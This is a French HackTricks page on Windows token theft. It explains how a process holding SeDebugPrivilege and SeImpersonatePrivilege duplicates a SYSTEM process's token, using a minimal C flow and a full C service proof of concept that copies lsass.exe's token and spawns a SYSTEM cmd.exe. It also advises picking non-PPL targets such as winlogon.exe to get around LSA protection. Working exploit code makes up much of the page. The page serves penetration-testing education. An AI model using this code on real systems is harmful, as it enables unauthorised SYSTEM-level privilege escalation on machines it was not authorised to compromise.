# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Cette page couvre la variante **manual token-theft**, dans laquelle un contexte **High Integrity** disposant déjà de **`SeDebugPrivilege`** et de **`SeImpersonatePrivilege`** ouvre un processus **SYSTEM** approprié, **duplique son token** et **lance un nouveau processus** avec ce token.

Si vous avez seulement besoin d'un shell **SYSTEM** rapide depuis un processus admin privilégié, consultez également :

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Si vous ne disposez pas d'un chemin via un handle de processus, mais que vous avez **`SeImpersonatePrivilege`**, la méthode **named-pipe / Potato** est généralement plus simple :

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Triage rapide

Avant d'essayer la méthode de copie du token, vérifiez que le processus actuel se trouve déjà dans un contexte utile :
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes :

- **`SeDebugPrivilege`** permet d’ouvrir de nombreux processus SYSTEM **non-protégés**, même lorsque leur DACL vous en empêcherait normalement.
- **`SeImpersonatePrivilege`** rend ensuite **`CreateProcessWithTokenW`** pratique.
- Si le chemin de copie du token ne fournit qu’un token SYSTEM faible ou filtré, volez-en simplement un depuis **un autre processus SYSTEM**.

## Choisissez soigneusement le processus cible

La technique est généralement présentée avec **`lsass.exe`**, mais sur les versions modernes de Windows, c’est souvent la **mauvaise cible** :

- Si **LSA Protection / RunAsPPL** est activé, **`lsass.exe`** est protégé et un processus admin normal disposant de **`SeDebugPrivilege`** ne pourra toujours pas l’ouvrir.<sup>[[2]](#references)</sup>
- Préférez des processus SYSTEM **non-PPL** tels que **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ou une instance précoce de **`svchost.exe`**.
- Les **protected processes** et certains processus spéciaux tels que **`System`** ou **`csrss.exe`** ne sont pas des cibles réalistes en user-mode pour cette technique.
- Utilisez **Process Hacker / Process Explorer** avec des privilèges élevés pour vérifier que le token cible possède effectivement les privilèges souhaités avant de le dupliquer.

## Détails des API importants en pratique

De nombreux PoC publics demandent **`PROCESS_ALL_ACCESS`** et **`TOKEN_ALL_ACCESS`**, mais cela génère plus de bruit que nécessaire. En pratique :

- Ouvrez le processus cible avec uniquement les droits nécessaires (généralement **`PROCESS_QUERY_INFORMATION`** ou **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Ouvrez le token avec les droits requis pour créer un processus : **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Utilisez **`DuplicateTokenEx(..., TokenPrimary, ...)`** pour créer un **primary token** ; un token d’impersonation seul ne suffit pas à créer un nouveau processus.
- Si **`CreateProcessWithTokenW`** échoue avec **`1314`**, utilisez **`CreateProcessAsUserW`**.
- Si vous lancez le processus depuis un **service / Session 0**, souvenez-vous que **`CreateProcessWithTokenW`** conserve le processus enfant dans la **session de l’appelant**. Si vous avez besoin d’un shell de bureau visible, utilisez **`CreateProcessAsUserW`** et déplacez le token vers la session souhaitée.<sup>[[1]](#references)</sup>

Un flux moderne minimal ressemble à ceci :
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## PoC de service complet

Le code suivant **exploite les privilèges `SeDebugPrivilege` et `SeImpersonatePrivilege`** pour copier le token d’un **processus exécuté en tant que SYSTEM** et disposant de **tous les privilèges du token**. Dans ce cas, le code peut être compilé et utilisé comme **binaire de service Windows** afin de vérifier que la primitive fonctionne.<sup>[[3]](#references)</sup>

La partie principale du **code où l’élévation se produit** se trouve dans la fonction **`Exploit`**. Dans cette fonction, vous pouvez voir que **`lsass.exe`** est recherché, que son **token est copié**, puis que ce token est utilisé pour lancer un nouveau **`cmd.exe`** avec tous les privilèges du token copié.

Sur les hôtes modernes, vous devrez souvent remplacer **`lsass.exe`** par un autre **processus SYSTEM non-PPL**, tel que **`winlogon.exe`**, **`wininit.exe`** ou **`services.exe`**.

Les autres processus exécutés en tant que SYSTEM avec tous les privilèges du token ou la plupart d’entre eux sont : **`services.exe`**, **`svchost.exe`** (certains des premiers), **`wininit.exe`**, **`csrss.exe`**... N’oubliez pas que vous ne pourrez généralement **pas copier le token d’un processus protégé**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Références

- [1] [fonction CreateProcessWithTokenW (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configurer la protection LSA supplémentaire (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Exécuter mon programme en tant que service (cboard.cprogramming.com) – squelette de service Windows utilisé par le PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
